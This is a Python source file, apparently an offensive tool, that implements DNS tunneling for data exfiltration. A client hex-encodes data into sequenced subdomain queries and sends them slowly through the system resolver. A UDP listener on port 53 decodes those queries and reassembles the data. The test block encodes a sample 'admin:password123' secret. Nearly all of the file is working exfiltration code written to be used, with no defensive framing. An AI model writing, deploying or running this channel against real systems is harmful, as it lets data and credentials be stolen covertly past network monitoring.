# -*- coding: utf-8 -*-
"""DNS tunneling -- encode exfil data as subdomain queries.

Client: chunk data, encode as hex, send as DNS TXT/A queries.
Server: listen on port 53, decode and reassemble queries.

Author: zxwn
"""
import base64, hashlib, struct, socket, time, threading


def encode_chunks(data: bytes, domain: str, chunk_size: int = 40) -> list:
    """Encode data into DNS query subdomains.

    Format: <seq>.<total>.<hex_data>.<domain>
    Example: 01.05.aabbccdd.dns.example.com
    """
    hex_data = data.hex()
    total = (len(hex_data) + chunk_size - 1) // chunk_size
    queries = []
    for i in range(total):
        chunk = hex_data[i * chunk_size : (i + 1) * chunk_size]
        seq = "{:02d}".format(i + 1)
        total_s = "{:02d}".format(total)
        queries.append("{}.{}.{}.{}".format(seq, total_s, chunk, domain))
    return queries


def decode_query(qname: str) -> tuple:
    """Decode DNS query back to (seq, total, hex_chunk)."""
    parts = qname.rstrip(".").split(".")
    if len(parts) < 4:
        return None
    seq = parts[0]
    total = parts[1]
    hex_data = parts[2]
    return (int(seq), int(total), hex_data)


def reassemble(chunks: dict) -> bytes:
    """Reassemble ordered hex chunks into original data."""
    ordered = [chunks[i] for i in sorted(chunks.keys())]
    hex_str = "".join(ordered)
    return bytes.fromhex(hex_str)


class DNSTunnelServer:
    """Minimal DNS server for receiving tunneled data."""

    def __init__(self, bind_addr: str = "0.0.0.0", port: int = 53):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((bind_addr, port))
        self.buffers = {}  # session_id -> chunks dict

    def listen(self, timeout: int = 60):
        self.sock.settimeout(timeout)
        start = time.time()
        while time.time() - start < timeout:
            try:
                data, addr = self.sock.recvfrom(512)
                qname = self._extract_qname(data)
                if qname:
                    result = decode_query(qname)
                    if result:
                        seq, total, chunk = result
                        session = hashlib.md5(addr[0].encode()).hexdigest()[:8]
                        if session not in self.buffers:
                            self.buffers[session] = {"total": total, "chunks": {}}
                        self.buffers[session]["chunks"][seq] = chunk
                        if len(self.buffers[session]["chunks"]) == total:
                            raw = reassemble(self.buffers[session]["chunks"])
                            print("[RECEIVED {}] {} bytes from {}".format(session, len(raw), addr[0]))
                            del self.buffers[session]
                            return raw
            except socket.timeout:
                break
        return None

    def _extract_qname(self, data: bytes) -> str:
        """Extract QNAME from DNS query packet."""
        if len(data) < 12:
            return ""
        qdcount = struct.unpack(">H", data[4:6])[0]
        if qdcount == 0:
            return ""
        pos = 12
        labels = []
        while pos < len(data):
            length = data[pos]
            if length == 0:
                break
            if length & 0xC0:
                break
            pos += 1
            labels.append(data[pos:pos+length].decode("ascii", errors="ignore"))
            pos += length
        return ".".join(labels)


def dns_exfil_client(server: str, data: bytes, domain: str, delay: float = 0.5):
    """Client: send data via DNS queries."""
    queries = encode_chunks(data, domain)
    for q in queries:
        try:
            socket.gethostbyname(q)
        except:
            pass
        time.sleep(delay)
    return len(queries)


if __name__ == "__main__":
    print("[dns_tunnel] Loaded.")
    # Test
    test_data = b"SECRET: admin:password123"
    queries = encode_chunks(test_data, "dns.example.com")
    for q in queries[:3]:
        print("  Q: " + q)
